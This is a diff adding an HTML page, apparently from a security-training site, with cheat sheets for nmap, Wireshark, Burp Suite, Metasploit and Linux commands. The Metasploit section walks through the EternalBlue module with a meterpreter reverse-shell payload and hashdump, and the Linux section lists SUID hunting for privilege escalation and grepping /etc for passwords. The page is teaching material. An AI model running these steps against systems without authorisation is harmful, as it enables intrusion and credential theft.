@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Tools Guide — sec-projects</title>
+  <meta name="description" content="Quick-reference guide for essential cybersecurity tools — Nmap, Wireshark, Burp Suite, Metasploit, and more.">
+  <meta property="og:title" content="Tools Guide — sec-projects">
+  <meta property="og:description" content="Quick-reference guide for essential cybersecurity tools.">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://sec-projects.pages.dev/resources/tools.html">
+  <link rel="canonical" href="https://sec-projects.pages.dev/resources/tools.html">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/assets/css/theme.css">
+  <link rel="stylesheet" href="/assets/css/layout.css">
+  <link rel="stylesheet" href="/assets/css/components.css">
+  <style>
+    .tool-section { margin-bottom: var(--space-8); }
+    .tool-section h2 { font-family: var(--font-mono); font-size: var(--font-size-xl); }
+    .cheat-row { display: flex; gap: var(--space-2); padding: var(--space-2) 0; border-bottom: 1px solid var(--color-border); font-size: var(--font-size-sm); }
+    .cheat-cmd { font-family: var(--font-mono); color: var(--color-green); min-width: 280px; font-size: var(--font-size-xs); word-break: break-all; }
+    .cheat-desc { color: var(--color-text-secondary); flex: 1; }
+    .tool-header { display: flex; align-items: center; gap: var(--space-3); margin-bottom: var(--space-3); }
+    .tool-icon { font-size: 1.5rem; }
+    .tool-tags { display: flex; flex-wrap: wrap; gap: var(--space-2); margin-bottom: var(--space-3); }
+  </style>
+</head>
+<body>
+  <div class="container" style="max-width:900px; margin: calc(var(--nav-height) + var(--space-8)) auto var(--space-8); padding: 0 var(--space-6);">
+    <div class="breadcrumbs">
+      <a href="/">Home</a> <span class="breadcrumb-sep">/</span> <span>Tools Guide</span>
+    </div>
+
+    <h1>Tools Guide</h1>
+    <p style="font-size:var(--font-size-lg);color:var(--color-text-secondary);margin-bottom:var(--space-8);">
+      Quick-reference cheat sheets for essential cybersecurity tools. Keep this bookmarked while working through the projects.
+    </p>
+
+    <!-- Nmap -->
+    <div class="tool-section">
+      <div class="tool-header"><span class="tool-icon">&#x1F50D;</span><h2>nmap</h2></div>
+      <p style="color:var(--color-text-muted);margin-bottom:var(--space-3);">Network discovery and security auditing. The gold standard for port scanning.</p>
+      <div class="tool-tags"><span class="tag">network</span><span class="tag">recon</span><span class="tag">scanning</span></div>
+      <h4>Essential Scans</h4>
+      <div class="cheat-row"><span class="cheat-cmd">nmap -sS TARGET</span><span class="cheat-desc">SYN stealth scan (default for root) — fast, less detectable</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">nmap -sT TARGET</span><span class="cheat-desc">TCP connect scan — works without root privileges</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">nmap -sU TARGET</span><span class="cheat-desc">UDP scan — slower, but essential (DNS, SNMP, DHCP)</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">nmap -sV TARGET</span><span class="cheat-desc">Version detection — identify service versions</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">nmap -O TARGET</span><span class="cheat-desc">OS fingerprinting — guess the target operating system</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">nmap -A TARGET</span><span class="cheat-desc">Aggressive scan — OS, version, script scanning, traceroute</span></div>
+      <h4 style="margin-top:var(--space-4);">Port Specification</h4>
+      <div class="cheat-row"><span class="cheat-cmd">nmap -p 22,80,443 TARGET</span><span class="cheat-desc">Scan specific ports</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">nmap -p 1-1000 TARGET</span><span class="cheat-desc">Scan port range</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">nmap -p- TARGET</span><span class="cheat-desc">Scan all 65535 ports</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">nmap --top-ports 100 TARGET</span><span class="cheat-desc">Scan top 100 most common ports</span></div>
+      <h4 style="margin-top:var(--space-4);">NSE Scripts</h4>
+      <div class="cheat-row"><span class="cheat-cmd">nmap --script=vuln TARGET</span><span class="cheat-desc">Run all vulnerability detection scripts</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">nmap --script=http-enum TARGET</span><span class="cheat-desc">Enumerate web directories and files</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">nmap --script=smb-os-discovery TARGET</span><span class="cheat-desc">Discover SMB/Samba OS information</span></div>
+      <h4 style="margin-top:var(--space-4);">Output</h4>
+      <div class="cheat-row"><span class="cheat-cmd">nmap -oN output.txt TARGET</span><span class="cheat-desc">Normal output to file</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">nmap -oX output.xml TARGET</span><span class="cheat-desc">XML output (parseable)</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">nmap -oG output.gnmap TARGET</span><span class="cheat-desc">Grepable output</span></div>
+    </div>
+
+    <!-- Wireshark -->
+    <div class="tool-section">
+      <div class="tool-header"><span class="tool-icon">&#x1F50C;</span><h2>Wireshark / tshark</h2></div>
+      <p style="color:var(--color-text-muted);margin-bottom:var(--space-3);">Network protocol analyzer. The microscope for network traffic.</p>
+      <div class="tool-tags"><span class="tag">network</span><span class="tag">analysis</span><span class="tag">forensics</span></div>
+      <h4>Capture Filters (applied before capture)</h4>
+      <div class="cheat-row"><span class="cheat-cmd">host 192.168.1.1</span><span class="cheat-desc">Traffic to/from a specific host</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">port 80</span><span class="cheat-desc">Traffic on a specific port</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">tcp</span><span class="cheat-desc">Only TCP traffic</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">not arp</span><span class="cheat-desc">Exclude ARP traffic</span></div>
+      <h4 style="margin-top:var(--space-4);">Display Filters (applied after capture)</h4>
+      <div class="cheat-row"><span class="cheat-cmd">ip.addr == 192.168.1.1</span><span class="cheat-desc">Filter by IP address</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">tcp.port == 443</span><span class="cheat-desc">Filter by TCP port</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">http.request</span><span class="cheat-desc">Show only HTTP requests</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">dns</span><span class="cheat-desc">Show only DNS traffic</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">tcp.flags.syn == 1</span><span class="cheat-desc">SYN packets only (connection starts)</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">frame contains "password"</span><span class="cheat-desc">Search packet bytes for string</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">tcp.stream eq 5</span><span class="cheat-desc">Follow a specific TCP stream</span></div>
+      <h4 style="margin-top:var(--space-4);">tshark (CLI)</h4>
+      <div class="cheat-row"><span class="cheat-cmd">tshark -r capture.pcap</span><span class="cheat-desc">Read a capture file</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">tshark -r capture.pcap -Y "http"</span><span class="cheat-desc">Apply display filter</span></div>
+    </div>
+
+    <!-- Burp Suite -->
+    <div class="tool-section">
+      <div class="tool-header"><span class="tool-icon">&#x1F310;</span><h2>Burp Suite</h2></div>
+      <p style="color:var(--color-text-muted);margin-bottom:var(--space-3);">Web application security testing platform. The standard for web pentesting.</p>
+      <div class="tool-tags"><span class="tag">web</span><span class="tag">proxy</span><span class="tag">testing</span></div>
+      <h4>Key Modules</h4>
+      <div class="cheat-row"><span class="cheat-cmd">Proxy > Intercept</span><span class="cheat-desc">Intercept and modify HTTP requests in real-time</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">Repeater</span><span class="cheat-desc">Resend individual requests, modify parameters, observe responses</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">Intruder</span><span class="cheat-desc">Automated fuzzing — brute force, parameter testing, enumeration</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">Decoder</span><span class="cheat-desc">Encode/decode — URL, Base64, HTML entities, hex</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">Comparer</span><span class="cheat-desc">Compare two requests/responses byte-by-byte</span></div>
+      <h4 style="margin-top:var(--space-4);">Quick Tips</h4>
+      <div class="cheat-row"><span class="cheat-cmd">Ctrl+R</span><span class="cheat-desc">Send request to Repeater (from any tab)</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">Ctrl+I</span><span class="cheat-desc">Send to Intruder</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">Proxy > Options > 127.0.0.1:8080</span><span class="cheat-desc">Default proxy listener — set browser to this</span></div>
+    </div>
+
+    <!-- Metasploit -->
+    <div class="tool-section">
+      <div class="tool-header"><span class="tool-icon">&#x1F4A3;</span><h2>Metasploit (msfconsole)</h2></div>
+      <p style="color:var(--color-text-muted);margin-bottom:var(--space-3);">Exploitation framework. The Swiss Army knife of penetration testing.</p>
+      <div class="tool-tags"><span class="tag">exploitation</span><span class="tag">framework</span><span class="tag">post-exploit</span></div>
+      <h4>Basic Workflow</h4>
+      <div class="cheat-row"><span class="cheat-cmd">msfconsole</span><span class="cheat-desc">Start Metasploit</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">search TYPE:exploit NAME:smb</span><span class="cheat-desc">Search for exploits</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">use exploit/windows/smb/ms17_010_eternalblue</span><span class="cheat-desc">Select an exploit module</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">show options</span><span class="cheat-desc">Show required settings</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">set RHOSTS 192.168.1.10</span><span class="cheat-desc">Set target host</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">set LHOST 192.168.1.5</span><span class="cheat-desc">Set your IP (for reverse shells)</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><span class="cheat-desc">Choose payload</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">exploit</span><span class="cheat-desc">Run the exploit</span></div>
+      <h4 style="margin-top:var(--space-4);">Meterpreter (post-exploit)</h4>
+      <div class="cheat-row"><span class="cheat-cmd">sysinfo</span><span class="cheat-desc">Target system information</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">hashdump</span><span class="cheat-desc">Dump password hashes</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">shell</span><span class="cheat-desc">Drop to system shell</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">background</span><span class="cheat-desc">Background the session</span></div>
+    </div>
+
+    <!-- Linux CLI Essentials -->
+    <div class="tool-section">
+      <div class="tool-header"><span class="tool-icon">&#x1F427;</span><h2>Linux CLI Essentials</h2></div>
+      <p style="color:var(--color-text-muted);margin-bottom:var(--space-3);">Commands every security professional should know cold.</p>
+      <div class="tool-tags"><span class="tag">linux</span><span class="tag">cli</span><span class="tag">fundamentals</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">netstat -tulpn</span><span class="cheat-desc">List all listening ports with process names</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">ss -tulpn</span><span class="cheat-desc">Modern replacement for netstat</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">find / -perm -4000 2>/dev/null</span><span class="cheat-desc">Find SUID binaries (privilege escalation)</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">grep -r "password" /etc/ 2>/dev/null</span><span class="cheat-desc">Search for password strings in config files</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">strings /bin/ls | head -20</span><span class="cheat-desc">Extract readable strings from binaries</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">ps aux --sort=-%mem | head</span><span class="cheat-desc">Top processes by memory usage</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">history | grep nmap</span><span class="cheat-desc">Search command history</span></div>
+      <div class="cheat-row"><span class="cheat-cmd">chmod 600 id_rsa</span><span class="cheat-desc">Set proper SSH key permissions</span></div>
+    </div>
+  </div>
+
+  <script src="/assets/js/data.js"></script>
+  <script src="/assets/js/theme.js"></script>
+  <script src="/assets/js/components.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      document.body.prepend(renderNav());
+      document.body.appendChild(renderFooter());
+      const navLink = document.querySelector('[data-nav="tools"]');
+      if (navLink) navLink.classList.add('active');
+    });
+  </script>
+</body>
+</html>
